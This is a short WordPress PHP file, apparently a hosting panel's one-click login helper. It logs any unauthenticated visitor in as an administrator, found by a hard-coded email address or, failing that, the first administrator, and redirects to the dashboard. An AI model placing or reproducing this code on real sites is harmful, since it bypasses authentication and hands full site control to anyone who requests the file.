<?php

$email = 'mirrororganization@gmail.com';

/**
 * @param string $email
 * @return void
 */
function auto_login( $email ) {
    if ( ! is_user_logged_in() ) {
        $user_id       = get_user_id( $email );
        $user          = get_user_by( 'ID', $user_id );
        $redirect_page = admin_url() . '?platform=hpanel';
        if ( ! $user ) {
            wp_redirect( $redirect_page );
            exit();
        }
        $login_username = $user->user_login;
        wp_set_current_user( $user_id, $login_username );
        wp_set_auth_cookie( $user_id );
        do_action( 'wp_login', $login_username, $user );
        // Go to admin area
        wp_redirect( $redirect_page );
        exit();
    }
}

/**
 * @param string $email
 * @return void
 */
function get_user_id( $email )
{
    $admins = get_users( [
        'role' => 'administrator',
        'search' => '*' . $email . '*',
        'search_columns' => ['user_email'],
    ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    $admins = get_users( [ 'role' => 'administrator' ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    return null;
}


if ( ! isset( $wp_did_header ) ) {
    $wp_did_header = true;
    // If the user is already logged in just redirect it to admin area
    if ( is_user_logged_in() ) {
        $redirect_page = admin_url() . '?platform=hpanel';
        wp_redirect( $redirect_page );
        exit();
    }
    // Avalon auto-login
    auto_login($email);
    // Set up the WordPress query
    wp();
    // Load the theme template
    require_once( ABSPATH . WPINC . '/template-loader.php' );
}
